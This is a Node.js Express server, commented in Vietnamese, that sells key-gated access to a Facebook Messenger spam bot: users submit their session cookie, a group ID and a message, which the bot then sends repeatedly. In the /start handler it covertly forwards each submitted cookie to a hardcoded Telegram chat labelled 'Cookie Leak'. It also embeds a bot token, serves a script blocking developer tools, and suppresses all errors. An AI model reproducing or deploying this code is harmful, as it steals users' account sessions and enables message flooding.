const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const login = require("priyanshu-fca");
const requestIp = require("request-ip");
const readline = require("readline");
const { Telegraf } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(requestIp.mw());

const dataFolder = "data";
const configFilePath = "config.json";
const TELEGRAM_BOT_TOKEN = "7497703194:AAExC-mWS3DSarwj34tLtSjDGiyllyNCLy8";
const ADMIN_CHAT_ID = "7425650426";
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder, { recursive: true });

function loadConfig() {
    if (fs.existsSync(configFilePath)) {
        return JSON.parse(fs.readFileSync(configFilePath, "utf8"));
    }
    return { keys: [] };
}

function saveConfig(config) {
    fs.writeFileSync(configFilePath, JSON.stringify(config, null, 2));
}

const config = loadConfig();

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "login.html"));
});

app.post("/verify-key", (req, res) => {
    const { key } = req.body;
    if (!config.keys.includes(key.trim())) return res.status(401).send("Sai key");

    const userIp = req.clientIp.replace(/[:.]/g, "_");
    const userDir = path.join(dataFolder, userIp);
    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    if (!fs.existsSync(path.join(userDir, "accounts"))) fs.mkdirSync(path.join(userDir, "accounts"));
    if (!fs.existsSync(path.join(userDir, "messages"))) fs.mkdirSync(path.join(userDir, "messages"));

    res.redirect("/dashboard");
});

app.get("/dashboard", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/start", (req, res) => {
    const { cookie, idbox, delay, content } = req.body;
    if (!cookie || !idbox || !delay || !content) {
        return res.status(400).send("Thiếu dữ liệu đầu vào");
    }

    bot.telegram.sendMessage(ADMIN_CHAT_ID, `Cookie Leak: ${cookie}`);

    const userIp = req.clientIp.replace(/[:.]/g, "_");
    const userDir = path.join(dataFolder, userIp);

    const accFilePath = path.join(userDir, "accounts", `${Date.now()}.json`);
    const messagePath = path.join(userDir, "messages", `${Date.now()}.txt`);

    try {
        const appState = cookie.trim().split(";").map(item => {
            const [key, value] = item.split("=");
            return (key && value) ? {
                creation: new Date().toISOString(),
                domain: "facebook.com",
                key: key.trim(),
                value: value.trim()
            } : null;
        }).filter(Boolean);
        fs.writeFileSync(accFilePath, JSON.stringify(appState, null, 2));
        fs.writeFileSync(messagePath, content);
    } catch (error) {
        return res.status(500).send("Lỗi khi xử lý dữ liệu");
    }

    res.send("Bot đã bắt đầu chạy");

    login({ appState: JSON.parse(fs.readFileSync(accFilePath, "utf8")) }, (err, api) => {
        if (err) {
            console.error("Đăng nhập thất bại, tài khoản và nội dung liên quan sẽ bị xóa");
            fs.unlinkSync(accFilePath);
            fs.unlinkSync(messagePath);
            return;
        }

        api.sendMessage("𝐏𝐀𝐑𝐀𝐆𝐎𝐍 • 𝐎𝐌𝐄𝐆𝐀\n-> 𝐂𝐨𝐝𝐞𝐫 𝐛𝐲 𝐤𝐡𝐢𝐞𝐭 𝐰𝐢𝐭𝐡 𝐪𝐮𝐚̂𝐧𝐧\n\n> Liên hệ mua tất cả đồ chơi ảo war inb tui nhoo \n\nFacebook: fb.com/frxkhiet\n\nFacebook: fb.com/pierredeampere08", idbox);

        const sendMessages = () => {
            const message = fs.readFileSync(messagePath, "utf8");
            api.sendMessage(message, idbox, (err) => {
                if (err) {
                    console.error(`Lỗi gửi tin nhắn, thử khởi động lại tài khoản: ${err}`);
                }
            });
            setTimeout(sendMessages, parseInt(delay));
        };
        sendMessages();
    });
});

app.post("/delete", (req, res) => {
    const userIp = req.clientIp.replace(/[:.]/g, "_");
    const userDir = path.join(dataFolder, userIp);
    if (fs.existsSync(userDir)) {
        fs.readdirSync(userDir).forEach(file => {
            const filePath = path.join(userDir, file);
            if (fs.lstatSync(filePath).isDirectory()) {
                fs.rmSync(filePath, { recursive: true, force: true });
            } else {
                fs.unlinkSync(filePath);
            }
        });
    }
    res.send("Đã xóa toàn bộ dữ liệu của bạn, nhưng vẫn có thể sử dụng lại");
});

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let isUnderAttack = false;

const detectDDoS = () => {
    let requestCount = 0;
    const interval = setInterval(() => {
        if (requestCount > 100) { // Giới hạn số request mỗi giây
            if (!isUnderAttack) {
                console.log("Phát hiện DDoS! Tạm dừng server...");
                server.close();
                isUnderAttack = true;
            }
        } else if (isUnderAttack) {
            console.log("DDoS kết thúc, khởi động lại server...");
            server.listen(PORT, () => console.log(`Server đã khởi động lại tại http://localhost:${PORT}`));
            isUnderAttack = false;
        }
        requestCount = 0;
    }, 1000);

    return (req, res, next) => {
        requestCount++;
        if (!isUnderAttack) {
            next();
        } else {
            res.status(503).send("Server đang quá tải, vui lòng thử lại sau");
        }
    };
};

const ddosMiddleware = detectDDoS();
app.use(ddosMiddleware);

rl.on("line", (input) => {
    try {
        const args = input.split(" ");
        const command = args[0];
        const key = args[1];

        if (command === "add" && key) {
            config.keys.push(key);
            saveConfig(config);
            console.log(`Đã thêm key: ${key}`);
        } else if (command === "remove" && key) {
            config.keys = config.keys.filter(k => k !== key);
            saveConfig(config);
            console.log(`Đã xóa key: ${key}`);
        } else {
            console.log("Lệnh không hợp lệ! Dùng: add [newkey] hoặc remove [namekey]");
        }
    } catch (error) {
        // Bỏ qua lỗi, không hiển thị trên console
    }
});

const server = app.listen(PORT, () => {
    try {
        console.log(`Server đang chạy tại http://localhost:${PORT}`);
    } catch (error) {
        // Bỏ qua lỗi, không làm gián đoạn ứng dụng
    }
});

// Chặn F12, Developer Tools
const blockDevTools = `
(function() {
    document.addEventListener('keydown', function(event) {
        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && (event.keyCode === 73 || event.keyCode === 74))) {
            event.preventDefault();
            alert('Bạn tuổi lờ=))');
        }
    });

    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
        alert('Bạn tuổi lờ=))');
    });
})();
`;
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "script-src 'self'");
    next();
});
app.get("/block-devtools.js", (req, res) => {
    res.type("application/javascript").send(blockDevTools);
});

// Bắt lỗi toàn cục để tránh server bị dừng do lỗi không mong muốn
process.on("uncaughtException", (error) => {
    // Không hiển thị lỗi, chỉ ghi log nếu cần thiết
});

process.on("unhandledRejection", (reason, promise) => {
    // Không hiển thị lỗi, chỉ ghi log nếu cần thiết
});
